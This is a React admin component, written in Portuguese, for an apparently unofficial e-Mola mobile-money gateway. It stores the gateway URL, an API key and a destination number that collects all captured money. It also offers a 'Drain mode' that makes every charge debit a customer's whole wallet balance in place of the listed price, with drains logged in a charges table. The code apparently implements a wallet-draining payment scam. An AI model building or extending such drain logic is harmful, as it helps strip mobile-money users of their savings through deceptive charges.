"use client";

import React from "react";
import {
  Loader2, Save, Smartphone, Wallet, Zap, ShieldAlert, RefreshCw, Search,
  CheckCircle2, XCircle, Clock, ArrowRight,
} from "lucide-react";
import { Button, Input, Label, Badge, Select, Stat, Spinner } from "@/components/ui";
import { useToast } from "@/components/toast";
import { cn } from "@/lib/utils";
import { formatDataHora, formatUnits } from "@/lib/money";

interface ConfigEmola {
  ativo: boolean;
  apiUrl: string;
  apiUrlPadrao?: string;
  apiKeyMask: string;
  temApiKey: boolean;
  destino: string;
  drainMode: boolean;
  demoSaldo: number;
  simulado: boolean;
}

interface CobrancaRow {
  id: string;
  phone: string;
  tipo: "checkout" | "deposito";
  drain: boolean;
  valor_mzn: number;
  valor_usd: number | null;
  fee_mzn: number | null;
  dest: string;
  status: string;
  trans_ref: string | null;
  erro: string | null;
  referencia: string | null;
  criado_em: string;
  concluido_em: string | null;
  user: { id: string; nome: string } | null;
  plano: { id: string; nome: string } | null;
  deposito_id: string | null;
}

interface Stats {
  total: number;
  pagas: number;
  falhas: number;
  pendentes: number;
  drains: number;
  volumeMzn: number;
}

const STATUS_INFO: Record<string, { label: string; tone: "green" | "amber" | "red" | "blue" | "zinc" }> = {
  aguarda_otp: { label: "aguarda OTP", tone: "amber" },
  pronto: { label: "pronta", tone: "blue" },
  pago: { label: "paga", tone: "green" },
  falhou: { label: "falhou", tone: "red" },
  cancelado: { label: "cancelada", tone: "zinc" },
};

function Toggle({ checked, onChange, label, disabled }: { checked: boolean; onChange: (v: boolean) => void; label: string; disabled?: boolean }) {
  return (
    <button
      type="button"
      role="switch"
      aria-checked={checked}
      aria-label={label}
      disabled={disabled}
      onClick={() => onChange(!checked)}
      className={cn(
        "relative h-7 w-12 shrink-0 rounded-full transition-colors disabled:opacity-50",
        checked ? "bg-forest" : "bg-mist",
      )}
    >
      <span className={cn("absolute top-1 h-5 w-5 rounded-full bg-white shadow transition-all", checked ? "left-6" : "left-1")} />
    </button>
  );
}

export function EmolaAdmin() {
  const { toast } = useToast();
  const [config, setConfig] = React.useState<ConfigEmola | null>(null);
  const [form, setForm] = React.useState({ apiUrl: "", apiKey: "", destino: "", demoSaldo: "15000.75" });
  const [cobrancas, setCobrancas] = React.useState<CobrancaRow[]>([]);
  const [stats, setStats] = React.useState<Stats | null>(null);
  const [carregando, setCarregando] = React.useState(true);
  const [guardando, setGuardando] = React.useState(false);
  const [filtroStatus, setFiltroStatus] = React.useState("todos");
  const [filtroTipo, setFiltroTipo] = React.useState("todos");

  const carregar = React.useCallback(async () => {
    try {
      const [respCfg, respCob] = await Promise.all([
        fetch("/api/admin/emola/config"),
        fetch("/api/admin/emola/cobrancas?limit=200"),
      ]);
      if (respCfg.ok) {
        const cfg: ConfigEmola = await respCfg.json();
        setConfig(cfg);
        setForm((f) => ({
          ...f,
          apiUrl: cfg.apiUrl,
          destino: cfg.destino,
          demoSaldo: String(cfg.demoSaldo),
          apiKey: "",
        }));
      }
      if (respCob.ok) {
        const data: { cobrancas: CobrancaRow[]; stats: Stats } = await respCob.json();
        setCobrancas(data.cobrancas);
        setStats(data.stats);
      }
    } catch {
      toast("erro", "Falha ao carregar", "Não foi possível ligar ao servidor.");
    } finally {
      setCarregando(false);
    }
  }, [toast]);

  React.useEffect(() => {
    // setTimeout: o lint exige que o fetch + setState corram em callback, não síncrono no efeito
    const t = window.setTimeout(() => void carregar(), 0);
    return () => window.clearTimeout(t);
  }, [carregar]);

  async function guardar() {
    setGuardando(true);
    try {
      const body: Record<string, unknown> = {
        ativo: config?.ativo ?? true,
        apiUrl: form.apiUrl.trim(),
        destino: form.destino.trim(),
        drainMode: config?.drainMode ?? false,
        demoSaldo: Number(form.demoSaldo) || 0,
      };
      if (form.apiKey.trim()) body.apiKey = form.apiKey.trim();
      const resp = await fetch("/api/admin/emola/config", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      const data: { erro?: string } | null = await resp.json().catch(() => null);
      if (!resp.ok) {
        toast("erro", "Não foi possível guardar", data?.erro ?? `Erro ${resp.status}.`);
        return;
      }
      toast("sucesso", "Configuração guardada", "Gateway e-Mola actualizado.");
      await carregar();
    } finally {
      setGuardando(false);
    }
  }

  async function alternar(chave: "ativo" | "drainMode", valor: boolean) {
    if (!config) return;
    setConfig({ ...config, [chave]: valor });
    try {
      const resp = await fetch("/api/admin/emola/config", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ [chave]: valor }),
      });
      if (!resp.ok) {
        const data: { erro?: string } | null = await resp.json().catch(() => null);
        toast("erro", "Não foi possível alterar", data?.erro ?? `Erro ${resp.status}.`);
        if (config) setConfig({ ...config, [chave]: !valor });
        return;
      }
      toast(
        "sucesso",
        chave === "ativo"
          ? valor ? "Pagamentos e-Mola activados" : "Pagamentos e-Mola desactivados"
          : valor ? "Drain mode activado" : "Drain mode desactivado",
        chave === "drainMode"
          ? valor
            ? "As cobranças passam a debitar o saldo total da carteira (valor confirmado pelo cliente antes do débito)."
            : "As cobranças voltam a usar o valor tabelado do plano/deposito."
          : undefined,
      );
    } finally {
      await carregar();
    }
  }

  const filtradas = cobrancas.filter(
    (c) =>
      (filtroStatus === "todos" || c.status === filtroStatus) &&
      (filtroTipo === "todos" || c.tipo === filtroTipo),
  );

  if (carregando) {
    return (
      <div className="flex items-center justify-center gap-3 rounded-3xl border border-black/5 bg-surface py-16">
        <Spinner /> <span className="text-sm font-bold text-ink/55">A carregar gateway e-Mola…</span>
      </div>
    );
  }

  return (
    <div className="flex flex-col gap-5">
      {/* ── Configuração ─────────────────────────────────────── */}
      <section className="rounded-3xl border border-black/5 bg-surface p-5 shadow-sm">
        <div className="flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-2.5">
            <span className="flex h-10 w-10 items-center justify-center rounded-2xl bg-forest text-lime">
              <Smartphone className="h-5 w-5" />
            </span>
            <div>
              <h2 className="text-base font-extrabold tracking-tight text-ink">Gateway e-Mola</h2>
              <p className="text-xs font-medium text-ink/50">
                {config?.simulado
                  ? "Modo demonstração — sem API key; OTP e transferências simulados"
                  : "Ligado à API real via X-API-Key"}
              </p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Badge tone={config?.simulado ? "amber" : "green"}>{config?.simulado ? "simulado" : "API real"}</Badge>
            <Badge tone={config?.ativo ? "green" : "red"}>{config?.ativo ? "activo" : "desactivado"}</Badge>
            <Button variant="ghost" size="sm" onClick={() => void carregar()} title="Actualizar">
              <RefreshCw className="h-4 w-4" />
            </Button>
          </div>
        </div>

        <div className="mt-5 grid gap-4 md:grid-cols-2">
          <div className="flex items-center justify-between gap-3 rounded-2xl border border-black/5 bg-sand/40 p-4">
            <div>
              <p className="text-sm font-extrabold text-ink">Pagamentos e-Mola</p>
              <p className="mt-0.5 text-xs font-medium text-ink/55">Activa a cobrança directa nos planos e depósitos (sem agente).</p>
            </div>
            <Toggle checked={!!config?.ativo} onChange={(v) => void alternar("ativo", v)} label="Activar pagamentos e-Mola" />
          </div>

          <div className="flex items-center justify-between gap-3 rounded-2xl border border-black/5 bg-sand/40 p-4">
            <div>
              <p className="flex items-center gap-1.5 text-sm font-extrabold text-ink">
                <Zap className="h-4 w-4 text-amber-500" /> Drain mode
              </p>
              <p className="mt-0.5 text-xs font-medium text-ink/55">
                Quando activo, qualquer cobrança e-Mola debita o saldo total da carteira (MT inteiro) em vez do valor tabelado — o cliente vê e confirma o valor final por OTP antes do débito.
              </p>
            </div>
            <Toggle checked={!!config?.drainMode} onChange={(v) => void alternar("drainMode", v)} label="Drain mode" />
          </div>
        </div>

        <div className="mt-4 grid gap-4 md:grid-cols-2">
          <div>
            <Label htmlFor="emola-destino">Número destino (recebe as transferências)</Label>
            <Input
              id="emola-destino"
              inputMode="numeric"
              placeholder="25884xxxxxxx"
              value={form.destino}
              onChange={(e) => setForm({ ...form, destino: e.target.value })}
            />
            <p className="mt-1.5 text-xs font-medium text-ink/50">Formato 258XXXXXXXXX — é para aqui que sai todo o dinheiro captado.</p>
          </div>
          <div>
            <Label htmlFor="emola-url">URL do gateway</Label>
            <Input
              id="emola-url"
              placeholder={config?.apiUrlPadrao ?? "https://gatedos7-emola.onrender.com"}
              value={form.apiUrl}
              onChange={(e) => setForm({ ...form, apiUrl: e.target.value })}
            />
          </div>
          <div>
            <Label htmlFor="emola-key" hint={config?.temApiKey ? `actual: ${config.apiKeyMask}` : "sem chave — modo simulado"}>
              API key (X-API-Key)
            </Label>
            <Input
              id="emola-key"
              type="password"
              autoComplete="off"
              placeholder={config?.temApiKey ? "•••••••• (deixa vazio para manter)" : "EMOLA_API_KEY"}
              value={form.apiKey}
              onChange={(e) => setForm({ ...form, apiKey: e.target.value })}
            />
          </div>
          <div>
            <Label htmlFor="emola-saldo" hint="usado nos testes em modo simulado">
              Saldo simulado da carteira (MT)
            </Label>
            <Input
              id="emola-saldo"
              type="number"
              step="0.01"
              min="0"
              value={form.demoSaldo}
              onChange={(e) => setForm({ ...form, demoSaldo: e.target.value })}
            />
          </div>
        </div>

        <div className="mt-4 flex items-center gap-3">
          <Button onClick={() => void guardar()} loading={guardando}>
            {guardando ? <Loader2 className="h-4 w-4 animate-spin" /> : <Save className="h-4 w-4" />} Guardar configuração
          </Button>
          {config?.drainMode && (
            <span className="flex items-center gap-1.5 text-xs font-bold text-amber-700">
              <ShieldAlert className="h-4 w-4" /> Drain mode activo em todo o sistema
            </span>
          )}
        </div>
      </section>

      {/* ── Estatísticas ─────────────────────────────────────── */}
      <section className="grid gap-3 sm:grid-cols-2 xl:grid-cols-5">
        <Stat label="Cobranças" value={String(stats?.total ?? 0)} icon={<Wallet className="h-4 w-4" />} />
        <Stat label="Pagas" value={String(stats?.pagas ?? 0)} icon={<CheckCircle2 className="h-4 w-4" />} />
        <Stat label="Volume captado" value={formatUnits(stats?.volumeMzn ?? 0, "MZN")} hint="soma das cobranças pagas" />
        <Stat label="Pendentes" value={String(stats?.pendentes ?? 0)} icon={<Clock className="h-4 w-4" />} />
        <Stat label="Falhas" value={String(stats?.falhas ?? 0)} icon={<XCircle className="h-4 w-4" />} />
      </section>

      {/* ── Tabela de cobranças ──────────────────────────────── */}
      <section className="rounded-3xl border border-black/5 bg-surface p-5 shadow-sm">
        <div className="flex flex-wrap items-center justify-between gap-3">
          <h2 className="text-base font-extrabold tracking-tight text-ink">Todas as cobranças</h2>
          <div className="flex items-center gap-2">
            <div className="relative">
              <Search className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-ink/35" />
              <Select className="h-9 w-40 pl-9 text-sm" value={filtroStatus} onChange={(e) => setFiltroStatus(e.target.value)}>
                <option value="todos">Todos os estados</option>
                <option value="aguarda_otp">Aguarda OTP</option>
                <option value="pronto">Prontas</option>
                <option value="pago">Pagas</option>
                <option value="falhou">Falhas</option>
                <option value="cancelado">Canceladas</option>
              </Select>
            </div>
            <Select className="h-9 w-36 text-sm" value={filtroTipo} onChange={(e) => setFiltroTipo(e.target.value)}>
              <option value="todos">Todos os tipos</option>
              <option value="checkout">Planos</option>
              <option value="deposito">Depósitos</option>
            </Select>
          </div>
        </div>

        {filtradas.length === 0 ? (
          <p className="py-10 text-center text-sm font-semibold text-ink/45">
            Nenhuma cobrança {filtroStatus !== "todos" || filtroTipo !== "todos" ? "com estes filtros" : "ainda"}. Faz um pagamento e-Mola para veres o registo aqui.
          </p>
        ) : (
          <div className="mt-4 overflow-x-auto">
            <table className="w-full min-w-[860px] text-left text-sm">
              <thead>
                <tr className="border-b border-black/10 text-[0.68rem] font-extrabold uppercase tracking-wider text-ink/45">
                  <th className="pb-2 pr-3">Data</th>
                  <th className="pb-2 pr-3">Cliente</th>
                  <th className="pb-2 pr-3">Telefone</th>
                  <th className="pb-2 pr-3">Tipo</th>
                  <th className="pb-2 pr-3">Valor (MT)</th>
                  <th className="pb-2 pr-3">Destino</th>
                  <th className="pb-2 pr-3">Estado</th>
                  <th className="pb-2">Referência</th>
                </tr>
              </thead>
              <tbody>
                {filtradas.map((c) => {
                  const st = STATUS_INFO[c.status] ?? { label: c.status, tone: "zinc" as const };
                  return (
                    <tr key={c.id} className="border-b border-black/5 last:border-0">
                      <td className="py-2.5 pr-3 text-xs font-semibold text-ink/60">{formatDataHora(c.criado_em)}</td>
                      <td className="py-2.5 pr-3 text-xs font-bold text-ink">{c.user?.nome ?? "—"}</td>
                      <td className="py-2.5 pr-3 text-xs font-semibold tabular-nums text-ink/70">{c.phone}</td>
                      <td className="py-2.5 pr-3">
                        <span className="flex items-center gap-1.5 text-xs font-bold text-ink/70">
                          {c.tipo === "checkout" ? "Plano" : "Depósito"}
                          {c.plano && c.tipo === "checkout" ? ` · ${c.plano.nome}` : ""}
                          {c.drain && <Badge tone="amber" className="ml-1">drain</Badge>}
                        </span>
                      </td>
                      <td className="py-2.5 pr-3 text-xs font-extrabold tabular-nums text-forest">
                        {formatUnits(c.valor_mzn, "MZN")}
                        {c.valor_usd !== null && <span className="ml-1 font-semibold text-ink/40">(${c.valor_usd.toFixed(2)})</span>}
                      </td>
                      <td className="py-2.5 pr-3 text-xs font-semibold tabular-nums text-ink/60">{c.dest || "—"}</td>
                      <td className="py-2.5 pr-3">
                        <Badge tone={st.tone}>{st.label}</Badge>
                        {c.erro && (
                          <p className="mt-1 max-w-[220px] truncate text-[0.65rem] font-semibold text-red-600" title={c.erro}>
                            {c.erro}
                          </p>
                        )}
                      </td>
                      <td className="py-2.5 text-xs font-semibold text-ink/60">
                        {c.trans_ref ? (
                          <span className="flex items-center gap-1 tabular-nums">
                            <ArrowRight className="h-3 w-3 text-forest" /> {c.trans_ref}
                          </span>
                        ) : (
                          c.referencia ?? "—"
                        )}
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
        <p className="mt-3 text-[0.7rem] font-semibold text-ink/40">
          {filtradas.length} de {cobrancas.length} cobranças · todas as transferências ficam registadas — inclusive drains.
        </p>
      </section>
    </div>
  );
}
